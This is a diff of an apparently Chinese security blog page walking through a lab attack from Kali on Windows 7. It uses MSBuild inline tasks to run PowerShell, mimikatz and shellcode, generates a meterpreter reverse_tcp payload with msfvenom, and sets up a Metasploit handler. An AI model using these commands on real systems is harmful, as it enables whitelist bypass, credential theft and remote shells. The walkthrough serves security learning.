@@ -87,7 +87,7 @@
 <meta property="og:image" content="http://img.cdn.cuittk.cn/tmq7l4sjo7s0ph6rbosa1rplxf.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/aqbqcpnqh1t3mnlfsfghe4ktsx.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/tpusvspdjprb2yofrio0qier35.png">
-<meta property="og:updated_time" content="2020-02-26T08:09:32.592Z">
+<meta property="og:updated_time" content="2020-03-02T04:58:17.335Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Windows白加黑">
 <meta name="twitter:description" content="Windows白加黑攻击机：Kali Linux ：172.16.1.130受害机：Win 7_64位：172.16.1.135 MSBuild简介MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台MSBuild可在未安装Visual Studio的环境中编译.net的工程文件MSBuild可编译特定格式的xml文件">
@@ -382,12 +382,39 @@
     &lt;/UsingTask&gt;
 &lt;/Project&gt;
 </code></pre>
-<p>注：保存的文件名可以任意<br>cmd下执行：<br><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe helloworld</code><br>cmd输出helloworld，如图：<br><img src="http://img.cdn.cuittk.cn/8cnjqqgg90wqxn06z6ygh017fd.png" alt=""></p>
-<h5 id="执行powershell命令"><a href="#执行powershell命令" class="headerlink" title="执行powershell命令"></a>执行powershell命令</h5><p>可参照三好师傅分享的POC，地址如下：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml</a><br>该POC已将c#代码转换成xml文件的格式，编写需要注意的部分如下：<br>如图：<br><img src="http://img.cdn.cuittk.cn/3-1.png" alt=""><br>标记1TaskName可修改，但两个位置的名称需要对应<br>标记2为固定格式:<code>TaskFactory=&quot;CodeTaskFactory&quot;</code><br>标记3的路径在不同系统可能会有区别，准确的为：<br><code>$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll</code><br>系统默认安装路径为:<br><code>C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll</code><br>标记4为一个简单的输出helloworld实例<br>如图：<br><img src="http://img.cdn.cuittk.cn/3-2.png" alt=""><br>标记5为固定格式，定义为<code>public class ClassExample : Task, ITask</code><br>下载executes%20PowerShellCommands.xml重命名为：c<br><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c</code><br>实际测试POC如图,成功执行powershell命令<br><img src="http://img.cdn.cuittk.cn/3-3.png" alt=""></p>
-<h5 id="执行PE文件"><a href="#执行PE文件" class="headerlink" title="执行PE文件"></a>执行PE文件</h5><p>下载<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml</a><br>重命名为：aa，本环境只能用64位的.net Framework加载<br><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe aa</code><br><img src="http://img.cdn.cuittk.cn/pnr8noohzjmj9dvjwo0z99jbjf.png" alt=""></p>
-<h5 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h5><p>下载32位shellcode，需要使用32位.net Framework：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml</a><br>重命名为dd<br><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe dd</code><br><img src="http://img.cdn.cuittk.cn/wf34m6cfgp9qwmi2954xdtabp4.png" alt=""></p>
-<p>下载64位shellcode，需要使用64位.net Framework：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a><br>重命名为ee<br><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe ee</code><br>64位的能执行shellcode，但是会报错。<br><img src="http://img.cdn.cuittk.cn/tmq7l4sjo7s0ph6rbosa1rplxf.png" alt=""></p>
-<p>我们这里用64位的shellcode和64位的win7来操作。<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.118.134 lport=4444 -f csharp</code><br>生成shellcode之后我们需要用到一个三好学生师傅的<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a><br>的模板，把里面45行之后的改为自己的shellcode<br>然后msf监听</p>
+<p>注：保存的文件名可以任意<br>cmd下执行：</p>
+<pre><code class="language-html">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe helloworld
+</code></pre>
+<p>cmd输出helloworld，如图：<br><img src="http://img.cdn.cuittk.cn/8cnjqqgg90wqxn06z6ygh017fd.png" alt=""></p>
+<h5 id="执行powershell命令"><a href="#执行powershell命令" class="headerlink" title="执行powershell命令"></a>执行powershell命令</h5><p>可参照三好师傅分享的POC，地址如下：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20PowerShellCommands.xml</a><br>该POC已将c#代码转换成xml文件的格式，编写需要注意的部分如下：<br>如图：<br><img src="http://img.cdn.cuittk.cn/3-1.png" alt=""><br>标记1TaskName可修改，但两个位置的名称需要对应<br>标记2为固定格式:<code>TaskFactory=&quot;CodeTaskFactory&quot;</code><br>标记3的路径在不同系统可能会有区别，准确的为：</p>
+<pre><code class="language-html">$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll
+</code></pre>
+<p>系统默认安装路径为:</p>
+<pre><code class="language-html">C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll
+</code></pre>
+<p>标记4为一个简单的输出helloworld实例<br>如图：<br><img src="http://img.cdn.cuittk.cn/3-2.png" alt=""><br>标记5为固定格式，定义为</p>
+<pre><code class="language-html">public class ClassExample : Task, ITask
+</code></pre>
+<p>下载executes%20PowerShellCommands.xml重命名为：c</p>
+<pre><code class="language-html">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c
+</code></pre>
+<p>实际测试POC如图,成功执行powershell命令<br><img src="http://img.cdn.cuittk.cn/3-3.png" alt=""></p>
+<h5 id="执行PE文件"><a href="#执行PE文件" class="headerlink" title="执行PE文件"></a>执行PE文件</h5><p>下载<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml</a><br>重命名为：aa，本环境只能用64位的.net Framework加载</p>
+<pre><code class="language-html">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe aa
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/pnr8noohzjmj9dvjwo0z99jbjf.png" alt=""></p>
+<h5 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h5><p>下载32位shellcode，需要使用32位.net Framework：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml</a><br>重命名为dd</p>
+<pre><code class="language-html">C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe dd
+</code></pre>
+<p><img src="http://img.cdn.cuittk.cn/wf34m6cfgp9qwmi2954xdtabp4.png" alt=""></p>
+<p>下载64位shellcode，需要使用64位.net Framework：<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a><br>重命名为ee</p>
+<pre><code class="language-html">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe ee
+</code></pre>
+<p>64位的能执行shellcode，但是会报错。<br><img src="http://img.cdn.cuittk.cn/tmq7l4sjo7s0ph6rbosa1rplxf.png" alt=""></p>
+<p>我们这里用64位的shellcode和64位的win7来操作。</p>
+<pre><code class="language-html">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.118.134 lport=4444 -f csharp
+</code></pre>
+<p>生成shellcode之后我们需要用到一个三好学生师傅的<br><a href="https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml" target="_blank" rel="external">https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20x64%20shellcode.xml</a><br>的模板，把里面45行之后的改为自己的shellcode<br>然后msf监听</p>
 <pre><code class="language-html">msfconsole
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
